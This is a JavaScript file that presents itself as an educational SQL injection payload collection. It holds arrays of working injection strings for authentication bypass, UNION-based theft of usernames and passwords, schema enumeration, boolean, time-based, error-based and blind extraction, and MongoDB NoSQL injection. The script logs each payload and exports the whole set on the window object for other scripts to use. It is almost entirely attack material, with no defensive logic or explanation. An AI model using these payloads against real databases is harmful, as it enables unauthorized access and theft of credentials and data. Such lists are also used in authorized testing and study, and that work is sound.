// SQL Injection Payload Collection
// For educational purposes only - Use in controlled testing environments

console.log("🔍 SQL Injection Payloads Loaded");

// Basic SQL Injection Payloads
const basicPayloads = [
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR '1'='1",
    "admin'--",
    "admin'#",
    "admin'/*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--"
];

// Union-based SQL Injection
const unionPayloads = [
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT username,password FROM users WHERE id=1--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT @@version,NULL--",
    "' UNION SELECT database(),NULL--",
    "' UNION SELECT user(),NULL--"
];

// Boolean-based SQL Injection
const booleanPayloads = [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND (SELECT COUNT(*) FROM users)>0--",
    "' AND (SELECT LENGTH(username) FROM users LIMIT 1)>0--",
    "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)>64--"
];

// Time-based SQL Injection
const timePayloads = [
    "' AND (SELECT SLEEP(5))--",
    "' AND (SELECT BENCHMARK(1000000,MD5(1)))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' WAITFOR DELAY '00:00:05'--",  // SQL Server
    "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5))--"
];

// Error-based SQL Injection
const errorPayloads = [
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
];

// Blind SQL Injection
const blindPayloads = [
    "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1)=97--",
    "' AND (SELECT LENGTH(password) FROM users WHERE id=1)>5--",
    "' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%')>0--"
];

// NoSQL Injection (MongoDB)
const nosqlPayloads = [
    "' || 1==1",
    "' || 1==1 //",
    "'; return true; var x='",
    "'; return db.users.find(); var x='",
    "'; return db.users.findOne({username: 'admin'}); var x='"
];

// Function to test payloads
function testPayload(payload, description) {
    console.log(`Testing: ${description}`);
    console.log(`Payload: ${payload}`);
    console.log("---");
}

// Display all payloads
console.log("=== BASIC SQL INJECTION ===");
basicPayloads.forEach(payload => testPayload(payload, "Basic SQL Injection"));

console.log("=== UNION-BASED SQL INJECTION ===");
unionPayloads.forEach(payload => testPayload(payload, "Union-based SQL Injection"));

console.log("=== BOOLEAN-BASED SQL INJECTION ===");
booleanPayloads.forEach(payload => testPayload(payload, "Boolean-based SQL Injection"));

console.log("=== TIME-BASED SQL INJECTION ===");
timePayloads.forEach(payload => testPayload(payload, "Time-based SQL Injection"));

console.log("=== ERROR-BASED SQL INJECTION ===");
errorPayloads.forEach(payload => testPayload(payload, "Error-based SQL Injection"));

console.log("=== BLIND SQL INJECTION ===");
blindPayloads.forEach(payload => testPayload(payload, "Blind SQL Injection"));

console.log("=== NOSQL INJECTION ===");
nosqlPayloads.forEach(payload => testPayload(payload, "NoSQL Injection"));

// Export payloads for use in other scripts
window.sqlInjectionPayloads = {
    basic: basicPayloads,
    union: unionPayloads,
    boolean: booleanPayloads,
    time: timePayloads,
    error: errorPayloads,
    blind: blindPayloads,
    nosql: nosqlPayloads
};

console.log("✅ SQL Injection payloads loaded and ready for testing");
